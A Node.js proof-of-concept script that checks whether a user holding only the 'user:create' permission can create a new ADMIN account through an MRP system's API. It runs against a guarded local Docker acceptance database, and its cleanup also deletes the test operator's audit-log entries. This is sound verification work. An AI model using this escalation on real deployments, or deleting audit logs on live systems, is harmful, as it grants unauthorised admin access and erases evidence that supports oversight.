import { execFileSync } from 'node:child_process'
import { randomBytes, randomUUID } from 'node:crypto'
import { mkdirSync, writeFileSync } from 'node:fs'
import { dirname } from 'node:path'

const container = 'mrp-acceptance-20261104-mysql-1'
const output = process.argv[2]
if (!output?.endsWith('.json')) throw new Error('Pass a new result.json path')
const project = execFileSync('docker', ['inspect', '-f', '{{index .Config.Labels "com.docker.compose.project"}}', container], { encoding: 'utf8' }).trim()
if (project !== 'mrp-acceptance-20261104') throw new Error(`Unexpected project: ${project}`)

function sql(query) {
  return execFileSync('docker', ['exec', '-i', container, 'sh', '-c',
    'MYSQL_PWD="$MYSQL_ROOT_PASSWORD" mysql -uroot --default-character-set=utf8mb4 -N -B mrp_acceptance'],
  { input: query, encoding: 'utf8' }).trim()
}

const suffix = randomUUID().replaceAll('-', '').slice(0, 10)
const username = `UCR_${suffix}`
const target = `UCR_ADMIN_${suffix}`
const password = `A1!${randomBytes(24).toString('base64url')}`
const hash = execFileSync('htpasswd', ['-niB', username], { input: `${password}\n`, encoding: 'utf8' }).trim().split(':').slice(1).join(':')
const result = { status: 'RUNNING', at: new Date().toISOString() }
let roleId = 0
let userId = 0

try {
  roleId = Number(sql(`INSERT INTO role(code,name) VALUES('${username}','临时创建权限角色'); SELECT LAST_INSERT_ID();`))
  sql(`INSERT INTO role_permission(role_id,permission_id)
    SELECT ${roleId},id FROM permission WHERE code='user:create';`)
  userId = Number(sql(`INSERT INTO user(username,password_hash,need_change_password)
    VALUES('${username}','${hash}',0); SELECT LAST_INSERT_ID();`))
  sql(`INSERT INTO user_role(user_id,role_id) VALUES(${userId},${roleId});`)
  const login = await fetch('http://127.0.0.1:8183/api/v1/auth/login', {
    method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ username, password })
  })
  const session = await login.json()
  if (login.status !== 200 || !session.data?.token) throw new Error('Login failed')
  const adminRoleId = Number(sql("SELECT id FROM role WHERE code='ADMIN';"))
  const create = await fetch('http://127.0.0.1:8183/api/v1/users', {
    method: 'POST', headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${session.data.token}` },
    body: JSON.stringify({ username: target, roleIds: [adminRoleId] })
  })
  result.createStatus = create.status
  result.createdWithAdminRole = Number(sql(`SELECT COUNT(*) FROM user_role ur JOIN user u ON u.id=ur.user_id
    WHERE u.username='${target}' AND ur.role_id=${adminRoleId};`))
  result.status = create.status === 200 && result.createdWithAdminRole === 1 ? 'VULNERABLE' : 'NOT_REPRODUCED'
} catch (error) {
  result.status = 'ERROR'
  result.failure = String(error)
} finally {
  sql(`DELETE ur FROM user_role ur JOIN user u ON u.id=ur.user_id WHERE u.username='${target}';
    DELETE FROM user WHERE username='${target}';`)
  if (userId) sql(`DELETE FROM audit_log WHERE operator_id=${userId};
    DELETE FROM user_role WHERE user_id=${userId}; DELETE FROM user WHERE id=${userId};`)
  if (roleId) sql(`DELETE FROM role_permission WHERE role_id=${roleId}; DELETE FROM role WHERE id=${roleId};`)
  result.remainingUsers = Number(sql(`SELECT COUNT(*) FROM user WHERE username IN ('${username}','${target}');`))
  result.remainingRoles = Number(sql(`SELECT COUNT(*) FROM role WHERE code='${username}';`))
  if (result.remainingUsers || result.remainingRoles) result.status = 'ERROR'
  mkdirSync(dirname(output), { recursive: true })
  writeFileSync(output, JSON.stringify(result, null, 2) + '\n')
}
console.log(JSON.stringify(result))
if (result.status !== 'VULNERABLE') process.exitCode = 1
